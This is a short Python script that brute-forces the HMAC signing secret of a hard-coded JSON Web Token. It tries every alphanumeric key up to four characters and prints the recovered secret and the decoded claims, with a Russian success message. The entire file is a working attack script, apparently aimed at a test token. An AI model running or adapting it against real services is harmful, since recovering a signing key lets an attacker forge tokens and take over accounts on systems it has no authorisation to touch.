import jwt
import itertools
import string

characters = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
max_length = 4

def brute_force_attack(encoded_token):
    for length in range(1, max_length + 1):
        for guess in itertools.product(characters, repeat=length):
            secret = ''.join(guess)
            try:
                payload = jwt.decode(encoded_token, secret, algorithms=["HS256"])
                print(f"Успешно подобран секретный ключ: {secret}")
                print(payload)
                return
            except jwt.InvalidTokenError:
                continue

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0cGVnYXMiLCJleHAiOjE3MzI5NzI3NDAsImp0aSI6ImVmOTdiZDYzLWMwMGItNGQyZi05MWYwLTJmYzRmMTBiMTIwZSIsInR5cGUiOiJhY2Nlc3MifQ.4nC0_x9D2CFI1O_PigrO4ZWwTaPiVQsB833Nhhr_MNE"
brute_force_attack(token)
